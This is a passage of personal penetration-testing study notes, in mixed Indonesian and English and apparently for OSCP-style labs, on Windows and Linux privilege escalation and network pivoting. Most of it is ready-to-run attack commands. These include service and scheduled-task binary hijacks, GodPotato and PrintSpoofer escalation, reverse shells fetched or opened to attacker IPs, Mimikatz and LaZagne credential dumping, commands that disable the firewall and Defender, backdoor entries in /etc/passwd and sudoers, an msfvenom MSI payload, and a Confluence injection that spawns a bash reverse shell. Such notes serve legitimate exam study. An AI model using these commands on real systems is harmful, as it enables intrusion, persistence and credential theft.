copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'
```
5. Restart servicenya.
```cmd
Restart-Service GammaService
or
Stop-Service GammaService
Start-Service GammaService
```
>> Even error, itu krn binarnya berbubah dri yg intended. Tapi tetep keexecute.

6. Boom!

7. With PowerUp
```cmd
iwr http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1
powershell -ep bypass
. .\PowerUp.ps1
Invoke-AllChecks
```
Write-ServiceBinary -Name 'GammaService' -Path <HijackPath>
```cmd
Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"

Restart-Service GammaService
```
Note: Cuma powerup usernya gk persistent.

8. Boom!


## Scheduled Task (PENTING) #IMPORTANT

three pieces of information are vital to obtain from a scheduled task to identify possible privilege escalation vectors:
1) As which user account (principal) does this task get executed?
>> Cek tasknya diexecute sama user yg penting gk? kyk NT AUTHORITY\SYSTEM or as an administrative user

2) What triggers are specified for the task?
3) What actions are executed when one or more of these triggers are met?

Steps:
1) View scheduled task
```cmd
Get-ScheduledTask
Get-ScheduledTask | where {$_.TaskPath -notlike "%SystemRoot%" -and $_.TaskPath -notlike "%windir%" -and $_.TaskPath -notlike "COM handler"} | ft TaskName,TaskPath,State
or
schtasks /query
schtasks /query /fo LIST /v
schtasks /query /fo LIST /v > schtask_list.txt 

>> search aja pake notepad or grep. Cari yg ada "Task To Run" dan suspicious
```
>> Liat "TaskName", "Run As User", "Author", DAN "Task To Run" >> Kalo binarynya di custom path, it's suspicious
>> Liat "Schedule Type" >> buat tau kapan dia keeksekusi lagi. Biasanya kyk cron per 1 menit

2) Check permission binary tasknya. Bisa kita replace gk?
```cmd
icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
```
3) Kalo kita ada akses, ya timpa aja
```cmd
iwr -Uri http://192.168.119.3/adduser.exe -Outfile BackendCacheCleanup.exe
move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak
move .\BackendCacheCleanup.exe .\Pictures\
```
4) Boom.


## Using Exploits (ini izi bgt, tinggal google whoami /priv sati-satu aja)
SELALU CEK INI `whoami /priv`
SeBackupPrivilege, 
SeAssignPrimaryToken, 
SeLoadDriver, 
SeImpersonatePrivilege,
SeDebug

1. Ya, kyk biasa, cari vulnerable kernel, application, or privilege. and Exploit it
2. Module ini cuma jelasin PrinterSpoofer (SeImpersonatePrivileges)
```cmd
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe 
python3 -m http.server 8000
iwr -uri http://192.168.45.168:8000/PrinterSpoofer/PrintSpoofer64.exe -Outfile PrintSpoofer64
.\PrintSpoofer64.exe -i -c powershell.exe
whoami
```
3. Coba kita test pake godpotato.
```cmd
reg query "HKLM\SOFTWARE\Microsoft\Net Framework Setup\NDP" /s
iwr http://192.168.45.168:8000/GodPotato/GodPotato-NET4.exe -outfile GodPotato-NET4.exe
.\GodPotato-NET4.exe -cmd "cmd /c whoami"
.\GodPotato-NET4.exe -cmd "net user nox password123! /add"
.\GodPotato-NET4.exe -cmd "net localgroup administrators nox /add"
.\GodPotato-NET4.exe -cmd 'net localgroup "Remote Desktop Users" nox /add'
.\GodPotato-NET4.exe -cmd "cmd /c powershell iex (New-Object Net.WebClient).DownloadString('http://192.168.45.168:8000/Invoke-PowerShellTcpEx.ps1')"

One go:
iwr http://192.168.45.168:8000/GodPotato/GodPotato-NET4.exe -outfile GodPotato-NET4.exe
iwr http://192.168.45.168:8000/nc.exe -outfile nc.exe
certutil -urlcache -f "http://192.168.45.168:8000/GodPotato/GodPotato-NET4.exe" GodPotato-NET4.exe
certutil -urlcache -f "http://192.168.45.168:8000/nc.exe" nc.exe
.\GodPotato-NET4.exe -cmd 'cmd /c "C:\Users\chris\nc.exe" 192.168.45.168 5555 -e cmd.exe'
```
4. SELALU CEK HASIL `whoami /priv` di https://github.com/gtworek/Priv2Admin

net localgroup "Remote Desktop Users" nox /add
net localgroup "Remote Management Users" nox /add

======

1. Search Files
```cmd
dir /b/s *.txt
dir /b/s local.txt
dir /b/s proof.txt      

Get-ChildItem -Path C:\Users -Include local.txt,proof.txt -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
```
2. Winpeas (SELALU JALANIN DI AWAL, SEDIAIN 2 SESSION)

3. Juicy Potato (SeImpersonatePrivilege) >> OUTDATED, GodPotato is better.
https://github.com/k4sth4/Juicy-Potato/tree/main

4. PrinterSpoofer (SeImpersonatePrivilege)
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md

5. Adding user
```cmd
net user nox nox /add
net localgroup administrators nox /add
```

6. ls -la
```cmd
dir /q /ad
```

7. To check our permission in a file or directory
```cmd
PS C:\backup> poweshell Get-Acl C:\xampp\htdocs\logs | fl
```

8. Windows Symlinks Without Privilege, Check PG Symbolic #30, just use the https://github.com/googleprojectzero/symboliclink-testing-tools/releases/download/v1.0/Release.7z. Easy.

https://medium.com/@ardian.danny/oscp-practice-series-30-proving-grounds-symbolic-2afdae158ea5
Biasanya buat automated script yg backup file

```cmd
certutil -urlcache -f http://192.168.45.153/CreateSymlink.exe CreateSymlink.exe

CreateSymlink.exe "C:\xampp\htdocs\logs\request.log" "C:\Users\Administrator\.ssh\id_rsa"
```

9. Turn off Firewall, disable firewall.
```cmd
netsh advfirewall set currentprofile state off

netsh advfirewall set domainprofile state off

Enable inbound outbound:

netsh advfirewall firewall set rule name="all_inbound" new enable=yes
netsh advfirewall firewall set rule name="all_outbound" new enable=yes
netsh advfirewall firewall show rule name=all
```

10. PowerUp is awesome
```cmd
iex ((New-Object Net.WebClient).DownloadString('http://172.16.99.11/PowerUp.ps1'))

or 
certutil -urlcache -f http://172.16.99.11/PowerUp.ps1 PowerUp.ps1

. .\PowerUp.ps1
```
- Check for privilege escalation (FIND FOR SERVICE ABUSE)
```cmd
Invoke-AllChecks
```
- Copy command, usually gini
```cmd (-UserName copy dari whoami)
Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\student664' -Verbose
```

11. PowerView is awesome
```cmd 
This is most important
Get-DomainUser | select -ExpandProperty samaccountname
Get-DomainComputer | select -ExpandProperty dnshostname

If nothing useful, use other command look CRTP notes.
```

12. Disable AMSI and RTP, REALTIMEPROTECTION REAL TIME PROTECTION, DEFENDER.
```cmd
Set-MpPreference -DisableRealtimeMonitoring $true -Verbose 
Set-MpPreference -DisableIOAVProtection $true
```

13. Kerberoasting
```cmd
C:\AD\Tools\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt 

C:\AD\Tools\Rubeus.exe kerberoast /user:svcadmin /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt

C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt 
```

14. Mimikatz (Dumping password) >> Need local administrator
```cmd
certutil -urlcache -f "http://192.168.45.168:8000/mimikatz.exe" mimikatz.exe
powershell -ep bypass
iex (New-Object Net.WebClient).DownloadString('http://192.168.45.168:8000/Invoke-Mimikatz.ps1')

Invoke-Mimikatz -Command '"privilege::debug"' (pastikan Administrator)
Invoke-Mimikatz -Command '"token::elevate"'
Invoke-Mimikatz -Command '"sekurlsa::ekeys"' (Dumping krbtgt hash)
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"' (dapet NTLM and SHA1 hash)
Invoke-Mimikatz -Command '"lsadump::sam"' (No need to use this)
Invoke-Mimikatz -Command '"lsadump::secrets"'
Invoke-Mimikatz -Command '"vault::cred /patch"' (Cred vault)
```

15. Lazagne.exe (Dumping password without administrative privilege)
```cmd
wget https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe
HOW TO USE: https://github.com/AlessandroZ/LaZagne
LaZagne.exe all
```

16. OPTH (Maybe for pivoting later di AD, harusnya ada 1)
```cmd
Dapetin aesnya dari '"sekurlsa::ekeys"'

C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

17. Look for `AlwaysInstallElevated` permission
> Check with PowerUP or winPEAS.exe
```powershell (powerUp)
Get-RegistryAlwaysInstallElevated
```
```cmd
winPEAS.exe
```
```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

Kalo output 2 2nya adalah 1 atau 0x1 ITS EASY PRIVESC
```
> Tinggal bikin revshell msi aja, ntar langsung dapet NT AUTHORITY\SYSTEM
```cmd
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.199 LPORT=6969 -a x64 --platform Windows -f msi -o rev.msi
```

18. Check .NET version (for GodPotato) (SeImpersonatePrivilege)
```cmd
reg query "HKLM\SOFTWARE\Microsoft\Net Framework Setup\NDP" /s

GodPotato-NET4.exe -cmd "cmd /c whoami"
```

19. Check C:\Program Files for LAPS (Administrator Password Solution (Windows LAPS).
> Biasanya ada hardcoded administrator password
> `ldapsearch -x -H 'ldap://192.168.167.122' -D 'hutch\fmcsorley' -w 'CrabSharkJellyfish192' -b 'dc=hutch,dc=offsec' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd`
> [OSCP Practice Series 66] Proving Grounds-Hutch 

20. Find file versi powershell
```cmd
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

# EXPLOITING Keepas password manager
1. Akses secara GUI
```cmd
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

keepass2john Database.kdbx > keepass.hash

BUANG KATA Database: dari keepass.hash

hashcat --help | grep -i "KeePass"
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```
2. BISA AKSES .kdbx FILENYA PAKE KALI LINUX (kpcli)
```cmd
kpcli --kdb Database.kdbx
>> Masukkin master password yg udah dicrack
kpcli:/> ls
kpcli:/> cd Database/
kpcli:/> cd Database/
kpcli:/> General
kpcli:/> ls
kpcli:/> show 1
```



# Linux Privesc
https://gtfobins.github.io/
>> ALWAYS CHECK SUDO VERSION
>> FREEBSD OR OPENBSD LINUX MACHINE (SEARCH FOR Doas config files) >> RELIA .20 MACHINE
cat /usr/local/etc/doas.conf
https://dev.to/document10/a-simple-guide-for-configuring-sudo-and-doas-1k4k#:~:text=The%20default%20config%20is%20located,conf%20for%20FreeBSD.
>> **doas itu adalah alternative sudo di freebsd.**
https://book.hacktricks.xyz/linux-hardening/privilege-escalation
https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/doas/

## From The Course

AUTOMATED ENUM TOOLS
1. unix-privesc-check
```cmd
https://pentestmonkey.net/tools/unix-privesc-check/unix-privesc-check-1.4.tar.gz
/opt/unix-privesc-check

./unix-privesc-check standard > output.txt [RECOMMENDED LOW FALSE-POSITIVE]
./unix-privesc-check detailed > detailed.txt
```
2. Linpeas (THE BEST AND RECOMMENDED)
3. Linenum (meh)


1. Check `id`, liat ada id aneh gk. Cari privescnya.
2. Check `/etc/passwd`
eve:x:1001:1001:,,,:/home/eve:/bin/bash
<username>:<password>:<UID>:<GID>:<comment>:<home_folder>:<login_shell>
> Kalo **writable** somehow, pake sudoedit atau ada vulnerable permission kyk write
```bash
openssl passwd asdasd
```
output: dLPiXAZFFhhQ6
```bash
echo "nox:dLPiXAZFFhhQ6:0:0:root:/root:/bin/bash" >> /etc/passwd
```
>> Tinggal su or ssh.

3. EXPLOITING KERNEL. Check version for kernel exploit (OS, LINUX OS, LINUX VERSION, OS VERSION) [PENTING] >> LAST EFFORT AJA
```bash
cat /etc/issue
cat /etc/os-release
uname -a
uname -r
arch
hostnamectl
```
> Searching for exploits
```bash
searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"
```
> Copy, baca sourcenya, cari cara compilenya, transfer exploitnya. COMPILE DI TARGETNYA
```bash
cp /usr/share/exploitdb/exploits/linux/local/45010.c .
mv 45010.c cve-2017-16995.c
scp cve-2017-16995.c joe@192.168.123.216:
gcc cve-2017-16995.c -o cve-2017-16995
chmod +x cve-2017-16995
./cve-2017-16995
```
> PwnKit https://github.com/ly4k/PwnKit (CVE-2021-4034)

4. List system processes
```bash
ps aux
ps aux | grep root
```
5. Check network, for pivoting or portforwarding local services
> Check IPnya ada brp. Ini mesin ada di brp network. Berapa kakinya.
```bash
ip a
```
> Check routing table.
```bash
route
or
routel
```
> Check active connection
```bash
ss -anp
ss -tulpn
netstat -tulpn
```
6. Check for firewall (GUNA BUAT PRIVESC)
"if a network service is not remotely accessible because it is blocked by the firewall, it is generally accessible locally via the loopback interface. If we can interact with these services locally, we may be able to exploit them to escalate our privileges on the local system."
```bash
cat /etc/iptables/rules.v4
```
>> Biasanya ada suspicious port buat more investigation

7. Check for cron (scheduled task)
```bash
ls -lah /etc/cron*
cat /etc/crontab
crontab -l
./pspy64

grep "CRON" /var/log/syslog [PENTING]
```
Note: Output dari `crontab -l` dan `sudo crontab -l` bisa aja beda. Karena kita gk bisa liat crontabnya root. Makannya PSPY itu penting.

8. Exploiting Application (kalo ada application dengan version rentan, bisa diexploit) 
[PENTING, KELUAR DI STANLEY]
> Listing installed application with version in **Debian**
```bash
dpkg -l
```
> Listing installed application with version in **Red Hat**
```bash
rpm -qa
```
9. List all writable directory and files. Bisa guna buat bnyk hal kyk PATH privesc or cron PATH privesc
```bash
find / -writable -type d 2>/dev/null
find / -writable -type f 2>/dev/null [PENTING]
find / -readable -type f 2>/dev/null [PENTING]
```
10. Check for unmounted drives, and if they exists, check for the mount permission.
> List all mounted file system
```bash
mount
```
> List all drives that will be mounted at boot time
```bash
cat /etc/fstab
```
11. Check available disk (bisa aja ada disk yg gk di mount)
```bash
lsblk
```
12. Check for device drivers and kernel modules
- Enumerate the loaded kernel modules
```bash
lsmod
```
- Find specific info regarding specific module
```bash
/sbin/modinfo <kernel_module>
/sbin/modinfo libata
```
>> Nanti dapet versionnya, bisa cari exploit.

13. SUID (setuid & setgid)
https://gtfobins.github.io/
if the SUID permissions are set, the binary will run with the permissions of the file owner
```bash
find / -perm -u=s -type f 2>/dev/null | grep -v '^/proc\|^/run\|^/sys\|^/snap'
```
cara bikin file jadi setuid
```bash
chmod u+s <filename>
```

14. Check user's history and secrets
```bash
env
printenv
history
cat .bash_history
cat .bashrc

crunch 6 6 -t Lab%%% > wordlist
>> Generate password buat ssh brute-force pake hydra dari discovered password tadi "Lab"
% > all number (0-9)
```
15. Watch command, buat monitor perubahan. (bisa aja ada cronjob di sini)
```bash
watch -n 1 "ps -aux | grep pass" >> BUAT CHECK CRONJOB

watch -n 1 "ls -la /bin/bash"
```
16. tcpdump bisa dipake buat sniff traffic
```bash
sudo tcpdump -i lo -A | grep "pass"
OR KALO ADA CAPABILITIES, BISA TANPA SUDO
tcpdump -i lo -A | grep "pass"

tbh pspy lebih enak dilihat
```
17. Capabilities
https://gtfobins.github.io/ dan hacktrickz
- Liat kalo ada cap_setuid+ep or exec or yg aneh-aneh
```bash
/usr/sbin/getcap -r / 2>/dev/null

kalo `getcap` gk ada, itu bisa jadi krn gk ada di PATH.
> jadi selalu check absolute pathnya /usr/sbin/getcap
```

18. Abusing sudo
> Listing sudo configuration `/etc/sudoers`
```bash
sudo -l
```
> Adding sudo permission of a user. IF /etc/sudoers is writable [PENTING]
```bash
echo "joe ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
```

19. AppArmor
> A kernel module that provides mandatory access control (MAC) on Linux systems by running various application-specific profiles, and it's enabled by default on Debian 10
> Dia bisa ngeblock privesc attempt kita.
> Checking AppArmor status
```bash
aa-status
```

---

1. sudo -l
2. Check /etc/crontab and /etc/cron.d directory OR `crontab -l`
3. Run PSPY, check /etc/cron.d for potential scrips running for clarity.
4. Check SUID
```bash
find / -perm -u=s 2>/dev/null | grep -v '^/proc\|^/run\|^/sys\|^/snap'
```
5. Check files you can access or have privileges to
```bash
find / -user www-data 2>/dev/null | grep -v '^/proc\|^/run\|^/sys\|^/snap'
```
6. Check Capabilities
https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities
```bash
getcap -r / 2>/dev/null
```
7. Check /etc/shadow (there may be misconfigured privileges)
8. Check id
9. Run PSPY, see processes
10. Check netstat for other running services
```bash
netstat -tulpn
or
ss -tulpn
```
11. Check environment variables
```bash
printenv
```
12. Check bash history
```bash
history
or 
.bash_history
```
~~ If stuck, run linpeas, or check services you have discovered earlier. IT IS ALLOWED
~~ THIS IS FOR LAST EFFORTS, check sudo version, and kernel exploits

13. Linux Symlinks
```bash
ln -sf <target_file> <your_file>
ln -sf /home/m.sander/personal/creds-for-2022.txt targetfile
```
14. Check mail stuff if there's SMTP present, `/var/spool/mail`

15. Portforwarding with SSH
```bash
sudo ssh -L <local_port>:<destination_server_ip:<remote_port> yanto@69.69.69.69
ssh -L 37999:localhost:37999 marcus@192.168.184.139 -p 42022
```

16. Adding user entry to /etc/passwd (usually sudoedit privesc)
```bash
openssl passwd -1 -salt shatternox nox

add the output with format like this

shatternox:$1$shattern$9HOGQF24OUddAPPpVKTGj1:0:0:root:/root:/bin/bash
```
Or can just add entry to /etc/sudoers
```
samantha ALL=(ALL) NOPASSWD: ALL
```
Usually combo with symlink
```bash
ln -s /etc/sudoers /file/wehave/privilege_on

>> Lalu edit file yang kita punya privilege tersebut. Biasanya pake sudoedit
```
17. NEW! CVE FOR PRIVESC
https://pwning.tech/nftables/


# Port Redirection and SSH Tunneling [PENTING]

# Linux Environment

>> Check dulu `ip addr` and `ip route`
>>> Ada berapa network interface. Kakinya ada berapa.
>>> Contoh lab: Check configuration dari target. 
```bash
cat /var/atlassian/application-data/confluence/confluence.cfg.xml
```
>> Di sini keliatan dia connect ke kaki yang ens224 (ip kepala 10.4.50.63/24)
>> Berarti kita harus forward kaki yang itu (check 18.2.2 dan 18.2.3 aja biar lebih jelas)

## Port Forwarding with `socat`
1) On Foothold Machine
-ddd >> verbose
```bash
socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
```
>> 10.4.50.215 >> IP dari server postgresqlnya yg tidak accesible dari kali
>> 5432 >> Port postgresql yang dia host
>> Foothold listen di port 2345 dan akan forward request ke TCP:10.4.50.215:5432

2) On Kali Machine
```bash
psql -h 192.168.50.63 -p 2345 -U postgres
```
>> Tinggal konek ke IP Foothold Machine di port yang dia listen aja. Ntar akan diforward.
>> Kita akan bisa akses postgres di DMZnya yg tidak accessible sama kita
```postgresql query
postgres=# \l
postgres=# \c confluence
\c confluence
select * from cwd_user;
hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt
```
*After some enumeration, ternyata server postgrenya juga jalanin SSH*

3) On Foothold Machine (sama kyk tadi aja)
```bash
Kill proses tadi dulu
ps aux | grep socat
kill -9 3306

socat -ddd TCP-LISTEN:2222,fork TCP:10.4.50.215:22
```
4) On Kali Machine
```bash
ssh database_admin@192.168.50.63 -p2222
```
> CHISEL LU UDAH TAU, ada di catetan bawah.


## SSH Tunneling
### SSH Local Port Forwarding
```intermezzo dari notes.md buat SSH port forwarding kalo dah ada akses (Linux)
sudo ssh -L [service_port]:localhost:[service_port] [user]@[target_ip]
sudo ssh -L 7777:localhost:8000 anita@192.168.234.246 -i anita_ecdsakey -p 2222 (akses servicenya dari port 7777 local kita)
```

-- Scenario, dari server POSGRESQL ada internal network lain.
-- Gk ada socat lagi
1) On Foothold machine (Confluence)
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
ssh database_admin@10.4.198.215
```
2) On First Pivot (Postgresql)
```bash
ip addr
```
>> Ternyata dia punya 2 kaki (ada subnet lain), di 10.4.198.215/24 dan 172.16.198.215/24
```bash
ip route
```
3) Portscan IP yg lain (tbh lebih gampang kita proxychains lalu nmap -sn aja)
```bash
for i in $(seq 1 254); do nc -zv -w 1 172.16.198.$i 445; done
```
>> Ternyata ada port 445 terbuka di 172.16.198.217
>> Skrng gimana caranya kita akses ke sana dari Kali Linux kita? Karena jadi 2x lompat.
>> SSH Local port forwarding.
"we could create an SSH local port forward. This would listen on port 4455 on the WAN interface of CONFLUENCE01, forwarding packets through the SSH tunnel out of PGDATABASE01 and directly to the SMB share we found. We could then connect to the listening port on CONFLUENCE01 directly from our Kali machine."
4) Dari mesin Foothold (confluence)
```bash
ssh -N -L 0.0.0.0:4455:172.16.198.217:445 database_admin@10.4.198.215
```
>> We will instruct SSH to listen on all interfaces on port 4455 on CONFLUENCE01 (0.0.0.0:4455), then forward all packets (through the SSH tunnel to PGDATABASE01) to port 445 on the newly-found host (172.16.198.217:445).
>> Setelah masukkin ssh password gk akan ada output karena kita pake -N (prevent a shell from being opened)
>> Kalo kita check dari mesin CONFLUENCE01, kita listen di port 4455 as expected
```bash
ss -ntplu
```
5) Dari Kali Machine, tinggal enumerate SMB di 172.16.198.217:445 Lewat <IP_CONFLUENCE>:4455
```bash
smbclient -p 4455 -L //192.168.198.63/ -U hr_admin --password=Welcome1234
```
>> Ada scripts share
```bash
smbclient -p 4455 //192.168.198.63/scripts -U hr_admin --password=Welcome1234
ls
get Provisioning.ps1
```
Exercise:
> Confluence revshell
curl -v http://192.168.198.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.168/1234%200%3E%261%27%29.start%28%29%22%29%7D/

> SSH to db server
python3 -c 'import pty; pty.spawn("/bin/bash")'
ssh database_admin@10.4.198.215

> Cari the server running 4455
ip addr
for i in $(seq 1 254); do nc -zv -w 1 172.16.198.$i 4242; done
>> 172.16.198.217 open

> Create SSH Local tunnel to kali
ssh -N -L 0.0.0.0:7777:172.16.198.217:4242 database_admin@10.4.198.215

> Enum SMB
./ssh_local_client -i 192.168.198.63 -p 7777


### SSH DYNAMIC PORT FORWARDING (SOCKS PROXY AND PROXYCHAINS) (BETTER than LOCAL)
Scenario kyk sebelumnya
1) On Foothold Machine (Confluence)
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
ssh -N -D 0.0.0.0:1080 database_admin@10.4.198.215
```
>> Kita gk specify ip dan port target lagi. Langsung -D for dynamic aja.
2) On Kali Machine (kita gk bisa pake /etc/proxychains4.conf)
```bash
subl /etc/proxychains.conf
```
>> Tapikan ada bnyk filenya ada proxychains4.conf, proxychains.conf. Yg mana?
https://askubuntu.com/questions/1477928/how-can-i-tell-which-proxychains-config-file-to-use-if-i-have-proxychains-conf

proxychains looks for config file in following order:
> file listed in environment variable PROXYCHAINS_CONF_FILE or provided as a -f argument to proxychains script or binary.
> /proxychains.conf
> $(HOME)/.proxychains/proxychains.conf
> /etc/proxychains.conf
> /etc/proxychains4.conf

>> DI KALI KITA HARUS PAKE YG /etc/proxychains.conf
```/etc/proxychains.conf
socks5 192.168.198.63 1080
```
>> Tinggal tambahin aja.
>> 192.168.198.63 IP dan Port server yg jalanin socks proxy (CONFLUENCE01)
>> Beda aturan dengan yg chisel.

3) Enumerate SMB with proxychains
```bash
proxychains smbclient -L //172.16.198.217/ -U hr_admin --password=Welcome1234
```
4) Nmap with proxychains
```bash
proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.198.217

sudo proxychains nmap -sTV -Pn -n -vvv -p4800-4900 172.16.198.217
proxychains ./ssh_dynamic_client -i 172.16.198.217 -p 4872
```
>> NMAP VIA PROXYCHAINS HARUS -Pn karena proxychains gk bisa nerima ping balik.
>> Notice, kita gk bisa ssh ke server Postgresql pake proxychains. Krn pada kasus ini kita kyk langsung loncat setup proxychains di network Postgresql. Kita gk setup Proxychains di network Confluence. MAKANNYA DOUBLE PIVOTING WITH CHISEL IS BETTER, lebih flexible.

### SSH Remote Port Forwarding [INCASE ADA FIREWALL YG BLOCK LOCAL PORT FORWARDING]
> Scenario, ada firewall, gk bisa forward port postgresql kyk sebelumnya lagi.
> Firewall biasanya strict block inbound tapi gk block outbound, jadi kita balik aja prosesnya. Kali kita yg open buat SSH dan Confluence yg connect ke kita.

1) Open SSH server with kali
```bash
sudo systemctl start ssh
check if running
sudo ss -ntplu

>> set PasswordAuthentication to yes in /etc/ssh/sshd_config.
```
2) On Confluence machine after we got reverse shell. SSH ke kali kita pake -R buat remote forwarding.
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
yes

check 2345 dah bisa diakses blom.
ss -ntplu
```
3) Harusnya skrng kita udah bisa akses postgresql server dari local kali kita. TAPI HANYA PORT 5432 lewat 2345 aja. Karena ini gk dynamic. Next module baru dynamic
```bash
psql -h 127.0.0.1 -p 2345 -U postgres
\l
\c hr_backup
\d
select * from payroll;
```

Exercise:
- Revshell
- SSH Remote Port Forwarding
python3 -c 'import pty; pty.spawn("/bin/bash")'
ssh -N -R 127.0.0.1:7777:10.4.198.215:4444 nox@192.168.45.168
./ssh_remote_client -i 127.0.0.1 -p 7777

### SSH Remote Dynamic Port Forwarding [SAMA KYK SEBELUMNYA TP DYNAMIC, BETTER] 
>> Beda dengan yg Dynamic local port forwarding. (kalo ini kan interact within network second pivot)
>> Kalo ini, kita jadi bisa interact with network within Confluence server (kyk first pivoting with chisel)

1) On Confluence Server
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
ssh -N -R 9998 kali@192.168.118.4 // ssh -N -R 1080 nox@192.168.45.168
```
2) Check on kali udah ada port 9998 dong di local
```bash
sudo ss -ntplu
```
3) Setup proxychains
```bash /etc/proxychains.conf
socks5 127.0.0.1 9998
```
4) Sekarang harusnya bisa akses kaki lain di Confluence (10.4.198.63/24)
> IP MULTISERVER03 ada di 10.4.50.64 (bisa kita scan nmap)
```bash
proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.4.198.64
proxychains nmap -vvv -sT -p9000-9100 -Pn -n 10.4.198.64
```

### Using sshuttle for port forwarding.
>> Mengubah SSH Connection jadi kyk VPN. OP juga.
>> Need root privileges on the SSH client and Python3 on the SSH server

1) On Confluence Machine, kita coba port forward dulu agar bisa SSH ke database_admin
```bash
socat TCP-LISTEN:2222,fork TCP:10.4.198.215:22
```
2) On Kali Machine
```bash
sshuttle -r database_admin@192.168.198.63:2222 10.4.198.0/24 172.16.198.0/24
```
3) Sekarang kita seakan-akan udah connect VPN ke networknya Postgresql Server.
```bash
smbclient -L //172.16.198.217/ -U hr_admin --password=Welcome1234
```

# Windows Environment (Windows Tools)

## Remote Dynamic Portforwarding with ssh.exe (CUMA BISA KALO ADA GUI) (ssh remote dynamic port)
**Local dynamic port forwarding juga bisa. Commandnya sama persis dengan yg di Linux**
> On Windows versions with SSH installed, we will find **scp.exe, sftp.exe, ssh.exe**, along with other ssh-* utilities in %systemdrive%\Windows\System32\OpenSSH location by default.

1) On Kali Machine, start ssh service
```bash
sudo systemctl start ssh
```
2) Access Windows client via rdp or whatev
```bash
xfreerdp /v:192.168.198.64 /dynamic-resolution /u:rdp_admin  /p:P@ssw0rd! /cert:ignore +clipboard
ipconfig, cek kakinya
```
3) Locate ssh.exe on windows machine
```cmd
where ssh

>> Biasanya di sini: C:\Windows\System32\OpenSSH\ssh.exe
```
4) Check ssh.exe version. **Remote Dynamic Portforwarding di Windows cuma bisa dilakukan kalo versionnya di atas 7.6**
```cmd
ssh.exe -V
```
5) Initiate Remote Dynamic Forwarding (commandnya sama kyk yg linux)
```cmd
ssh -N -R 9998 kali@192.168.118.4 // ssh -N -R 1080 nox@192.168.45.168
```
6) On Kali Machine, dah ada 127.0.0.1:1080 apa belum
```bash
ss -ntplu
```
7) Tambahin socks proxy
```bash
socks5 127.0.0.1 9998
```
8) Sekarang kita bisa akses network within windows machinenya (kaki lainnya)
```bash
proxychains psql -h 10.4.198.215 -U postgres
\l
```

## Remote Portforwarding with Plink
>> Plink udah included di Kali Linux (locate plink.exe), jadi bisa transfer ke target aja.
>> Scenario lab: RDP diblock firewall, tapi ada webshell di 80. Jadi revshell dulu aja.

Webshell: 192.168.198.64/umbraco/forms.aspx

1) Transfer plink.exe
```cmd
powershell iwr http://192.168.45.168/plink.exe -outfile C:\Windows\Temp\plink.exe
```
> Revshell sekalian

2) Initiate Remote Portforwarding dari reverse shell (kita forward RDP aja)
```cmd
C:\Windows\Temp\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 <kali_ip>
y

C:\Windows\Temp\plink.exe -ssh -l nox -pw talp -R 127.0.0.1:9833:127.0.0.1:3389 192.168.45.168
y
```
*In much the same way that it's not possible to accept the SSH client key cache prompt from a non-TTY shell on Linux, with some very limited shells with Plink on Windows, we also won't be able to respond to this prompt. An easy solution in that case would be to automate the confirmation with cmd.exe /c echo y, piped into the plink.exe command. This will emulate the confirmation that we usually type when prompted. The entire command would be: cmd.exe /c echo y | .\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.41.7.*

```cmd
cmd.exe /c echo y | .\plink.exe -ssh -l nox -pw talp -R 127.0.0.1:9833:127.0.0.1:3389 192.168.45.167
```

